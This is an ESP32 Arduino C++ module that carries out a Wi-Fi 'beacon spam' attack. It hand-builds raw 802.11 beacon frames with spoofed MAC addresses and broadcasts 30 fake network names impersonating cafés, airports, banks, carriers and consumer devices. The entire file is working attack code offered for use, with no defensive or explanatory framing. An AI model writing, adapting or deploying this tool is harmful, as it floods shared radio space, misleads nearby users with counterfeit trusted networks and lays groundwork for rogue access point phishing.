#include <WiFi.h>
#include <esp_wifi.h>
#include "beacon.h"
#include "definitions.h"

extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

bool beacon_active = false;
int beacon_counter = 0;
unsigned long last_beacon = 0;

const char* ssids[] = {
  "FreeWiFi", "CoffeeShop", "Airport_Free", "Hotel_Guest", "Starbucks",
  "McDonalds", "Google_Free", "iPhone", "Samsung-TV", "HP-Print",
  "DIRECT-TV", "HomeWiFi", "Neighbor", "linksys", "NETGEAR",
  "TP-Link", "ASUS-Guest", "GoogleNest", "Apple-TV", "Amazon-Echo",
  "SmartHome", "xfinity", "ATT-WiFi", "Verizon", "Guest-Net",
  "Office-WiFi", "Store-Free", "Bank-WiFi", "Public-WiFi", "Trusted"
};

void send_beacon(const char* ssid, uint8_t* mac) {
  uint8_t pkt[128] = {0};
  
  pkt[0] = 0x80; // beacon
  pkt[1] = 0x00;
  pkt[2] = 0x00; pkt[3] = 0x00;
  memset(&pkt[4], 0xFF, 6); // dst
  memcpy(&pkt[10], mac, 6); // src
  memcpy(&pkt[16], mac, 6); // bssid
  pkt[22] = 0x10; pkt[23] = 0x00;
  
  unsigned long t = millis() * 1000;
  memcpy(&pkt[24], &t, 8);
  pkt[32] = 0x64; pkt[33] = 0x00;
  pkt[34] = 0x01; pkt[35] = 0x00;
  pkt[36] = 0x00;
  pkt[37] = strlen(ssid);
  memcpy(&pkt[38], ssid, strlen(ssid));
  
  esp_wifi_80211_tx(WIFI_IF_AP, pkt, 38 + strlen(ssid), false);
}

void start_beacon() {
  beacon_active = true;
  beacon_counter = 0;
  DEBUG_PRINTLN("Beacon Spam Started!");
}

void stop_beacon() {
  beacon_active = false;
  DEBUG_PRINT("Beacons sent: ");
  DEBUG_PRINTLN(beacon_counter);
}

void update_beacon() {
  if (!beacon_active) return;
  if (millis() - last_beacon < BEACON_INTERVAL) return;
  
  uint8_t mac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
  
  for (int i = 0; i < 30; i++) {
    mac[5] = i;
    send_beacon(ssids[i % 30], mac);
    beacon_counter++;
  }
  
  last_beacon = millis();
}

bool is_beacon_running() { return beacon_active; }
int get_beacon_count() { return beacon_counter; }